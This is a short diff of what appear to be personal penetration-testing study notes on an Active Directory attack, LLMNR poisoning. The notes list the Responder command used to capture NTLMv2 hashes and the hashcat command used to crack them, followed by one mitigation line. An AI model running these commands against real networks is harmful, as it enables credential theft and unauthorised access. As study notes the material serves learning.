@@ -2,11 +2,12 @@
 <h1>Initial Attack AD</h1>
 - LLMNR(link local multi-name resolution)
 	- executes when dns fails
-	- Step1: Run responder
-		- python Responder.py -I tun0 -rdwv
-	- Step2: An event occurs
-	- Step3:Get dem hashes
-	- Step4: Crack Dem hashes
+	
+	**Step1: Run responder**
+	- python Responder.py -I tun0 -rdwv
+	**Step2: An event occurs**
+	**Step3:Get dem hashes**
+	**Step4: Crack Dem hashes**
 		- hashcat -m 5600 hashes.txt rockyou.txt
 	Mitigations
 		disable llmnr
